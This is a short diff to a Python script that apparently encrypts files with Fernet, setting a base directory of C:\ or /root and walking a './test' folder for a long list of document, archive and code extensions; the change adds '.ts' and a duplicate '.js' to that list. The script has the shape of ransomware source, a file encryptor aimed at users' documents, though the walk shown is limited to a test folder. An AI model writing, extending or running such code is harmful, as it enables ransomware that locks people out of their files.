@@ -9,7 +9,7 @@ import time
 from cryptography.fernet import Fernet
 
 # Determine the base directory based on the operating system
-base = "c:\\" if os.name == 'nt' else "/root"
+base = "C:\\" if os.name == 'nt' else "/root"
 
 # Function to encrypt files
 
@@ -36,7 +36,8 @@ def encrypt(key, fpath):
 
 def filelist():
     target_ext = (".txt", ".pdf", ".png", ".jpeg", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
-                  ".pptx", ".rar", ".gzip", ".zip", ".exe", ".html", ".css", ".js", ".py", ".odt", ".csv")
+                  ".pptx", ".rar", ".gzip", ".zip", ".exe", ".html", ".css", ".js", ".py",
+                  ".odt", ".csv", ".js", ".ts")
 
     for root, dirs, files in os.walk('./test'):
         for file in files:
